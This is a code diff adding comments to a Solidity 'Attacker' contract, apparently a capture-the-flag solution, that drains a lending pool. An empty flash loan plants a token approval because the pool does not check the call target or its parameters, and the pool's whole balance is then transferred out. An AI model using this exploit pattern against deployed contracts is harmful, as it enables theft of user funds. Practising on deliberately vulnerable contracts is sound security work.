@@ -18,6 +18,8 @@ contract Attacker {
 
         uint256 poolBalance = dvt.balanceOf(address(lender));
 
+        // @dev - execute empty flashloan but add this contract approval to transfer all tokens from lenderPool
+        // as the lender pool does not check the address of the contract to call neither the parameters
         require (
             lender.flashLoan(
                 0,
@@ -27,6 +29,7 @@ contract Attacker {
             )
         );
 
+        // @dev - transfer all tokens from lenderPool to the designated recovery address
         require(dvt.transferFrom(address(lender), recoveryAddress, poolBalance));
 
         return true;
